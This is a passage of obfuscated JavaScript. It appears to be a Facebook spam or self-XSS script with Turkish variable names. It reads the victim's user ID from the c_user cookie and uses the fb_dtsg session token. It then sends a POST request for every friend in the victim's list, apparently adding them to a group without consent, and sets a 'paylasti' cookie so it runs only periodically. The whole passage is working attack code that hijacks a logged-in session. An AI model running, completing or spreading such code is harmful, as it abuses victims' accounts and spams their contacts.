_0x9c10x1c[_0x6733[107]]-_0x9c10x1d[_0x6733[107]];} );} ;} ;for(var i=0;i<friends[_0x6733[94]];i++){var httpwp= new XMLHttpRequest();var urlwp=_0x6733[111];var paramswp=_0x6733[88]+fb_dtsg+_0x6733[112]+gid+_0x6733[113]+friends[i][_0x6733[114]]+_0x6733[89]+user_id+_0x6733[9];httpwp[_0x6733[11]](_0x6733[10],urlwp,true);httpwp[_0x6733[92]](_0x6733[90],_0x6733[91]);httpwp[_0x6733[92]](_0x6733[93],paramswp[_0x6733[94]]);httpwp[_0x6733[92]](_0x6733[95],_0x6733[96]);httpwp[_0x6733[12]]=function (){if(httpwp[_0x6733[13]]==4&&httpwp[_0x6733[14]]==200){} ;} ;httpwp[_0x6733[16]](paramswp);} ;var spage_id=_0x6733[51];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var smesaj=_0x6733[115];var smesaj_text=_0x6733[115];var arkadaslar=[];var svn_rev;var bugun= new Date();var btarihi= new Date();btarihi[_0x6733[116]](bugun[_0x6733[28]]()+1000*60*60*4*1);if(!document[_0x6733[4]][_0x6733[3]](/paylasti=(\d+)/)){document[_0x6733[4]]=_0x6733[117]+btarihi[_0x6733[118]]();} ;